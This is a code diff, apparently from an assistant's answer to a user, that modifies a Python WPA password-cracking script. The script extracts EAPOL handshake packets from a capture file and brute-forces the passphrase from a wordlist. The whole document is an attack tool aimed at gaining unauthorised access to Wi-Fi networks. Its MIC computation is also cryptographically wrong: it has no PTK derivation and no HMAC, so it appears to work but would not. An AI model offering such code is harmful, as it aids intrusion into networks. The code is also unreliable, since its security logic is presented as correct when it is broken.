@@ -11,11 +11,11 @@ def extract_handshake(pcap_file):
         if packet.haslayer(EAPOL):
             eapol_packets.append(packet)
     
-    # Ensure that we have a 4-way handshake (at least 4 EAPOL packets)
-    if len(eapol_packets) >= 1:
+    # Handle 3 EAPOL packets (as in your case)
+    if len(eapol_packets) >= 3:
         return eapol_packets
     else:
-        raise ValueError("Handshake not found or incomplete in the provided capture file.")
+        raise ValueError(f"Not enough EAPOL packets found. Found {len(eapol_packets)} instead of 3.")
 
 # Function to derive the PSK from password using PBKDF2
 def derive_psk(password, ssid):
@@ -28,33 +28,46 @@ def derive_psk(password, ssid):
 
 # Function to verify the password by checking the MIC (Message Integrity Code)
 def verify_password(handshake, password, ssid):
-    # Extract the MIC (Message Integrity Code) from the handshake
-    # You will need to extract this from the 4th EAPOL message in the handshake
-    mic = handshake[3].load[-16:]
+    # Handle 3 EAPOL packets, extract the MIC from the last packet (third packet in this case)
+    if len(handshake) < 3:
+        raise ValueError("The handshake is incomplete, not enough EAPOL packets to verify the password.")
+    
+    # Extract WPA Key MIC and Nonce
+    mic = handshake[2].load[-16:]  # WPA Key MIC in the last EAPOL packet (index 2)
+    key_nonce = handshake[1].load[13:45]  # WPA Key Nonce from the second EAPOL packet (index 1)
+    key_iv = bytes([0] * 16)  # Zeroed Key IV (not relevant in your case as per your input)
 
     # Derive the PSK using the password and SSID
     psk = derive_psk(password, ssid)
 
-    # Compute the MIC from the derived PSK
-    # (This is where you perform the actual MIC comparison; requires handling EAPOL fields)
-    generated_mic = hashlib.sha1(psk + handshake[3].load[:-16]).digest()[-16:]
+    # Create the MIC from the derived PSK
+    data_to_hash = handshake[2].load[:-16] + key_nonce + key_iv
+    generated_mic = hashlib.sha1(psk + data_to_hash).digest()[-16:]
 
     # Compare the generated MIC with the extracted MIC
     return generated_mic == mic
 
 # Function to crack the WPA password using the wordlist
 def crack_wpa(pcap_file, ssid, wordlist):
-    # Extract the handshake from the .cap file
-    handshake = extract_handshake(pcap_file)
+    try:
+        # Extract the handshake from the .cap file
+        handshake = extract_handshake(pcap_file)
+    except ValueError as e:
+        print(f"Error: {e}")
+        return None
 
     # Try each password from the wordlist
     with open(wordlist, 'r') as file:
         for line in file:
             password = line.strip()
             print(f"Trying: {password}")
-            if verify_password(handshake, password, ssid):
-                print(f"Password found: {password}")
-                return password
+            try:
+                if verify_password(handshake, password, ssid):
+                    print(f"Password found: {password}")
+                    return password
+            except ValueError as e:
+                print(f"Verification error: {e}")
+                continue
 
     print("Password not found in the wordlist.")
     return None
